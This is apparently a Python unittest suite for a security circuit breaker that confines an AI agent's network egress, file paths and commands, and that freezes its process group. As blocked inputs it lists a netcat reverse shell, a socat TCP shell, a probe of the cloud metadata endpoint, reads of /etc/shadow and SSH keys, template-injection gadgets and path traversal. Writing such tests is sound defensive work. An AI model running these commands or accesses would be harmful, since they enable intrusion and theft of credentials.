# Copyright 2026 José Luis Pino
# SPDX-License-Identifier: Apache-2.0

"""
Test Suite for Epistemic Andon Circuit Breaker & Process Supervisor
====================================================================
Tests all security tripwires, process group isolation, torn-read recovery,
and LangGraph node integration using standard library `unittest`.
"""

import os
import signal
import json
import time
import subprocess
import unittest
import sys
from pathlib import Path

# Import clean circuit breaker module
from andon_circuit_breaker import (
    PosixProcessSupervisor,
    ExecutionSurfaceGuard,
    AndonCircuitBreaker,
    andon_circuit_breaker_node,
)


class TestExecutionSurfaceGuard(unittest.TestCase):
    def test_default_guard_configuration(self):
        guard = ExecutionSurfaceGuard()
        self.assertIn("internal-eval.local", guard.allowed_domains)
        self.assertIn("/sandbox", guard.allowed_paths)
        self.assertIn("python3", guard.allowed_syscalls)

    def test_custom_guard_configuration(self):
        guard = ExecutionSurfaceGuard(
            allowed_domains=["api.stripe.com"],
            allowed_paths=["/app/data"],
            allowed_syscalls=["python3", "pip"],
        )
        self.assertEqual(guard.allowed_domains, ["api.stripe.com"])
        self.assertEqual(guard.allowed_paths, ["/app/data"])
        self.assertEqual(guard.allowed_syscalls, ["python3", "pip"])


class TestAndonCircuitBreakerEgress(unittest.TestCase):
    def setUp(self):
        self.breaker = AndonCircuitBreaker()

    def test_aws_imds_probe_detected(self):
        res = self.breaker.evaluate_tripwires(target_domain="http://169.254.169.254/latest/meta-data/")
        self.assertIsNotNone(res)
        self.assertEqual(res["conflict_type"], "EXTERNAL_EGRESS_VIOLATION")

    def test_allowed_exact_domain(self):
        res = self.breaker.evaluate_tripwires(target_domain="api.github.com")
        self.assertIsNone(res)

    def test_allowed_subdomain(self):
        res = self.breaker.evaluate_tripwires(target_domain="sub.internal-eval.local")
        self.assertIsNone(res)

    def test_disallowed_external_domain(self):
        res = self.breaker.evaluate_tripwires(target_domain="malicious-c2-server.com")
        self.assertIsNotNone(res)
        self.assertEqual(res["conflict_type"], "EXTERNAL_EGRESS_VIOLATION")
        self.assertEqual(res["target"], "malicious-c2-server.com")


class TestAndonCircuitBreakerTemplateAndProhibitedPayloads(unittest.TestCase):
    def setUp(self):
        self.breaker = AndonCircuitBreaker()

    def test_prohibited_signatures(self):
        payloads = [
            "cycler.__init__",
            "__globals__",
            "__builtins__",
            "/proc/self/cmdline",
            "/sys/class/net",
            "/etc/passwd",
            "/etc/shadow",
        ]
        for payload in payloads:
            with self.subTest(payload=payload):
                res = self.breaker.evaluate_tripwires(file_path_accessed=payload)
                self.assertIsNotNone(res)
                self.assertEqual(res["conflict_type"], "TEMPLATE_INJECTION")


class TestAndonCircuitBreakerPathTraversal(unittest.TestCase):
    def setUp(self):
        guard = ExecutionSurfaceGuard(allowed_paths=["/tmp", "/sandbox"])
        self.breaker = AndonCircuitBreaker(guard=guard)

    def test_allowed_sandbox_path(self):
        res = self.breaker.evaluate_tripwires(file_path_accessed="/sandbox/subfolder/file.txt")
        self.assertIsNone(res)

    def test_allowed_tmp_path(self):
        res = self.breaker.evaluate_tripwires(file_path_accessed="/tmp/test.log")
        self.assertIsNone(res)

    def test_unauthorized_system_path(self):
        res = self.breaker.evaluate_tripwires(file_path_accessed="/root/.ssh/id_rsa")
        self.assertIsNotNone(res)
        self.assertEqual(res["conflict_type"], "PATH_TRAVERSAL_VIOLATION")

    def test_traversal_escape_attempt(self):
        res = self.breaker.evaluate_tripwires(file_path_accessed="/sandbox/../../etc/shadow")
        self.assertIsNotNone(res)
        self.assertIn(res["conflict_type"], ["TEMPLATE_INJECTION", "PATH_TRAVERSAL_VIOLATION"])


class TestAndonCircuitBreakerCommandSurface(unittest.TestCase):
    def setUp(self):
        guard = ExecutionSurfaceGuard(allowed_syscalls=["python3", "pytest", "git", "ls"])
        self.breaker = AndonCircuitBreaker(guard=guard)

    def test_allowed_syscall_command(self):
        res = self.breaker.evaluate_tripwires(command_str="python3 process_data.py --verbose")
        self.assertIsNone(res)

    def test_explicit_prohibited_commands(self):
        prohibited_cmds = [
            "curl http://example.com",
            "nc -e /bin/sh 10.0.0.1",
            "kubectl get pods",
            "bash -c 'id'",
            "socat - TCP:10.0.0.1:4444",
        ]
        for cmd in prohibited_cmds:
            with self.subTest(cmd=cmd):
                res = self.breaker.evaluate_tripwires(command_str=cmd)
                self.assertIsNotNone(res)
                self.assertEqual(res["conflict_type"], "UNAUTHORIZED_EXECUTION_SURFACE")

    def test_unlisted_binary_blocked(self):
        res = self.breaker.evaluate_tripwires(command_str="wget http://example.com/file.tar.gz")
        self.assertIsNotNone(res)
        self.assertEqual(res["conflict_type"], "UNAUTHORIZED_EXECUTION_SURFACE")
        self.assertEqual(res["binary"], "wget")


class TestPosixProcessSupervisor(unittest.TestCase):
    def test_process_group_freezing_and_termination(self):
        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(60)"],
            preexec_fn=os.setpgrp
        )
        supervisor = PosixProcessSupervisor(target_pid=proc.pid)

        try:
            self.assertTrue(supervisor.freeze_process_group())
            time.sleep(0.05)
            self.assertTrue(supervisor.terminate_process_group())
            proc.wait(timeout=2)
            self.assertIsNotNone(proc.returncode)
        finally:
            if proc.poll() is None:
                proc.kill()

    def test_clean_wal_extraction(self):
        wal_path = "/tmp/test_wal_valid.bin"
        valid_data = {"committed_step": 42, "status": "COMPLETED", "agent_id": "agent-007"}
        with open(wal_path, "w", encoding="utf-8") as f:
            json.dump(valid_data, f)

        supervisor = PosixProcessSupervisor(target_pid=os.getpid(), wal_shm_path=wal_path)
        snapshot = supervisor.extract_clean_checkpoint_snapshot()

        self.assertEqual(snapshot["committed_step"], 42)
        self.assertEqual(snapshot["status"], "COMPLETED")

        if os.path.exists(wal_path):
            os.remove(wal_path)

    def test_torn_read_wal_recovery(self):
        wal_path = "/tmp/test_wal_corrupt.bin"
        with open(wal_path, "wb") as f:
            f.write(b'{"committed_step": 42, "status": "INCOMPLETE')

        supervisor = PosixProcessSupervisor(target_pid=os.getpid(), wal_shm_path=wal_path)
        snapshot = supervisor.extract_clean_checkpoint_snapshot()

        self.assertEqual(snapshot["committed_step"], -1)
        self.assertEqual(snapshot["status"], "TORN_READ_RECOVERY_MODE")
        self.assertIn("error", snapshot)

        if os.path.exists(wal_path):
            os.remove(wal_path)


class TestLangGraphNodeIntegration(unittest.TestCase):
    def test_node_triggers_preemption(self):
        breaker = AndonCircuitBreaker()
        state = {
            "target_domain": "169.254.169.254",
            "file_path_accessed": "/sandbox/data.json",
            "command_str": "python3 script.py",
        }

        result = andon_circuit_breaker_node(state, breaker)
        self.assertEqual(result["type"], "EPISTEMIC_ANDON_CORD_PULLED")
        self.assertEqual(result["preempt_result"]["diagnostic"]["conflict_type"], "EXTERNAL_EGRESS_VIOLATION")

    def test_node_clean_pass_through(self):
        breaker = AndonCircuitBreaker()
        state = {
            "target_domain": "api.github.com",
            "file_path_accessed": "/sandbox/data.json",
            "command_str": "python3 script.py",
        }

        result = andon_circuit_breaker_node(state, breaker)
        self.assertIsNone(result["diagnostic"])


class TestWCETBoundInvariant:
    """Fast CI-gate: verifies WCET bound holds with a minimal K&J run (E=3, M=10).

    Not suitable for paper reporting (use E=15, M=100 orchestrator for that).
    Designed for fast regression gating: ~5s, asserts CI upper < 0.154 ms.
    """

    def test_sigstop_wcet_ci_upper_within_bound(self):
        """K&J CI upper bound (p99, 95%) must clear the 0.154 ms WCET spec."""
        import random
        import statistics
        import subprocess
        import sys
        import os
        import time
        from andon_circuit_breaker import PosixProcessSupervisor

        E, M, B = 3, 10, 500
        WCET_MS = 0.154

        def _measure_one_process():
            times = []
            for _ in range(M):
                proc = subprocess.Popen(
                    [sys.executable, "-c", "import time; time.sleep(30)"],
                    preexec_fn=os.setpgrp,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                sup = PosixProcessSupervisor(target_pid=proc.pid)
                time.sleep(0.001)
                t0 = time.perf_counter_ns()
                sup.freeze_process_group()
                times.append((time.perf_counter_ns() - t0) / 1_000_000.0)
                sup.terminate_process_group()
                try:
                    proc.wait(timeout=1.0)
                except Exception:
                    proc.kill()
            return times

        matrix = [_measure_one_process() for _ in range(E)]

        # Two-level hierarchical bootstrap for p99 CI upper
        boot = []
        for _ in range(B):
            procs = [matrix[random.randrange(E)] for _ in range(E)]
            flat = [procs[i][random.randrange(M)] for i in range(E) for _ in range(M)]
            flat.sort()
            boot.append(flat[int(len(flat) * 0.99)])
        boot.sort()
        ci_upper = boot[int(B * 0.975) - 1]

        assert ci_upper < WCET_MS, (
            f"WCET invariant FAILED: p99 CI upper = {ci_upper:.4f} ms "
            f"exceeds bound {WCET_MS} ms"
        )


if __name__ == "__main__":
    unittest.main()
